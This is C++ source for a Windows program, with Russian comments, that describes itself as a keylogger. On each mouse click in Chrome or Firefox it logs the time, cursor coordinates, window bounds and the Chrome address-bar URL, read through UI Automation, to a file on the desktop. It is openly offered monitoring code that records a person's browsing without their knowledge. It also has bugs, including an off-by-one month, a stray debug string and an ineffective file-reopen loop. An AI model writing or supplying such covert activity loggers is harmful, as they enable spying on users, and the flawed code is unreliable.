// ConsoleApplication5.cpp: определяет точку входа для консольного приложения.
// кейлогер , который при клике пишет в файл время, координаты клика и данные из окна chrome


#include "stdafx.h"
#include "atltypes.h"
#include "atlstr.h"
#include <iostream>
#include <string>
#include <Windows.h>
#include <psapi.h>
#include <commdlg.h>
#include "stdafx.h"
#include "atltypes.h"
#include "atlstr.h"
#include <fstream> // работа с файлами
#include <string>
#include <Windows.h>
#include <psapi.h>
#include <commdlg.h>
#include "stdafx.h"
#include <AtlBase.h>
#include <AtlCom.h>
#include <UIAutomation.h>	// работа с пользовательским интерфейсом??
#include <time.h>
#include <atlbase.h>
#include <atlconv.h>
//#include "Source.cpp"


#define UNICODE

using namespace std;

string get_url(string windows_name)
{
	USES_CONVERSION;
	CoInitialize(NULL);		// необходимо для инициализации COM-потока
	HWND hwnd = NULL;		// hwnd - уникальный номер экземпляра окна программы
	BSTR url1 = NULL;
	string str_url;
	while (true)
	{
		if (windows_name.find("chrome") != string::npos)
		{
			hwnd = FindWindowEx(		// функция поиска дочерних окон
				0,						// дескриптор родительского окна ( hwndParent - ПУСТО (NULL), функция использует окно рабочего стола как родительское окно.)
				hwnd,					// дескриптор дочернего окна (если и hwndParent и hwndChildAfter - ПУСТО (NULL), функция ищет все окна верхнего уровня)
				"Chrome_WidgetWin_1",	// указатель имени класса
				NULL					// указатель имени окна (Если этот параметр ПУСТО (NULL), имена всех окон соответствующие.)
			);
			//cout << "gopa2 " << "\n";
		}
		/*else
		{
			cout << "gopa1 " << "\n";
			hwnd = FindWindowEx(0, hwnd, "MozillaWindowClass", NULL);
		}*/
		if (!hwnd)
			break;
		if (!IsWindowVisible(hwnd))	// находит данные о состоянии видимости заданного окна
			continue;

		CComQIPtr<IUIAutomation> uia;	// CComQIPtr - интелектуальный указатель для COM-объектов
										// IUIAutomation - Предоставляет методы, позволяющие клиентским приложениям
										// Microsoft UI Automation обнаруживать, получать доступ и фильтровать 
										// элементы автоматизации пользовательского интерфейса
		if (FAILED(uia.CoCreateInstance(CLSID_CUIAutomation)) || !uia)
			break;

		CComPtr<IUIAutomationElement> root;		// IUIAutomationElement - типа элемент пользовательского интерфейса 
		if (FAILED(uia->ElementFromHandle(hwnd, &root)) || !root)
			break;
		

		CComPtr<IUIAutomationCondition> condition;	// состояние

													// Идентификатор URL-адреса равен 0xC354 или используется UIA_EditControlTypeId для первого окна редактирования
		uia->CreatePropertyCondition(		// Создает условие, которое выбирает элементы, у которых есть свойство с указанным значением
			UIA_ControlTypePropertyId,		// Идентификатор свойства
			CComVariant(0xC354),			// Значение свойства
			&condition						// Указатель на новое условие
		);

		//или используйте edit control's name взамен
		//uia->CreatePropertyCondition(UIA_NamePropertyId, 
		//      CComVariant(L"Address and search bar"), &condition);

		CComPtr<IUIAutomationElement> edit; // редактор
		if (FAILED(root->FindFirst(TreeScope_Descendants, condition, &edit))
			|| !edit)
			continue; //maybe we don't have the right tab, continue...
		//cout << "gopa " <<  "\n";
		CComVariant url;
		edit->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &url);
		url1 = url.bstrVal;	
		str_url =  OLE2CA(url1);
		break;
	}
	CoUninitialize();	// закрытие COM-потока
	return str_url;
}

string get_active_window()
{
	/*
	 * Функция, возвращающая наименование активного окна 
	 */
	DWORD pid;
	GetWindowThreadProcessId(GetForegroundWindow(), &pid);		// получаем идентификатор процесса, которому принадлежит активное окно
	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,	// получаем описатель (дескриптор, хендл) процесса
		FALSE, pid);														// При открытии процесса достаточно указать право на PROCESS_QUERY_INFORMATION — получение ограниченной информации о процессе.
	
	if (hProc)
	{
		TCHAR szPath[MAX_PATH];
		GetProcessImageFileName(hProc, szPath, sizeof(szPath));
		CloseHandle(hProc);

		// Пытаемся извлечь имя файла. Если GetProcessImageFileName по каким-то
		// причинам предоставил не путь, а просто имя, возвращаем именно его.
		TCHAR szTitle[MAX_PATH];
		if (GetFileTitle(szPath, szTitle, sizeof(szTitle)) == 0)
			return string(szTitle);
		else
			return string(szPath);
		CloseHandle(hProc);
	}
	else
	{
		// Ошибка при открытии процесса. За подробностями — к GetLastError()
		return string();
	}
}

string get_time_now()
{
	/*
	 * Текущее время алоть до секунд
	 */
	struct tm newtime;
	char am_pm[] = "AM";
	time_t long_time;
	char timebuf[26];
	errno_t err;

	time(&long_time);
	// Convert to local time.  
	err = localtime_s(&newtime, &long_time);
	if (err)
	{
		printf("Invalid argument to _localtime64_s.");
		exit(1);
	}
	string s = to_string(newtime.tm_mday) + "." + to_string(newtime.tm_mon) + "." + to_string(1900 + newtime.tm_year) + "\t";
	// Convert to an ASCII representation.   
	err = asctime_s(timebuf, 26, &newtime);
	if (err)
	{
		printf("Invalid argument to asctime_s.");
		exit(1);
	}
	s += string(timebuf).substr(11, 8) + "\t";
	return s;
}

void keylogger(ofstream &file)
{
	/* кейлоггер */
	file << "2323232";
	tm* ptr;
	time_t seconds;
	int i;
	CPoint pt;
	CRect rect;
	HWND hWnd;
	string str;
	for (i = 1; i < 200; i++)
	{
		Sleep(100);
		if ((GetAsyncKeyState(VK_LBUTTON) != 0) || (GetAsyncKeyState(VK_RBUTTON) != 0) || (GetAsyncKeyState(VK_MBUTTON) != 0))
		{
			GetCursorPos(&pt);
			hWnd = GetForegroundWindow();
			GetWindowRect(hWnd, &rect);
			str = get_active_window();
			if ((str.find("chrome") != string::npos) || (str.find("firefox") != string::npos))
			{
				file << get_time_now(); // дата
				// курсор
				file << "(" << pt.x  << ";" << pt.y << ")\t";
				// координаты активного окна
				file << "[(" << rect.left << ";" << rect.top << ");(" << rect.left+rect.Width() << ";" << rect.top + rect.Height() << ")]\t";
				// url активного окна
				file << get_url(str) << endl;
			}
		}
	}
}

int main()
{
	setlocale(LC_ALL, "rus");
	ofstream log_file("D:\\Desktop\\1.txt", std::ios_base::app);
	while (!log_file.is_open())
		ofstream log_file("D:\\Desktop\\1.txt");
	log_file << "start\n";
	log_file << "start2\n";
	keylogger(log_file);
	log_file.close();
	return 0;
}
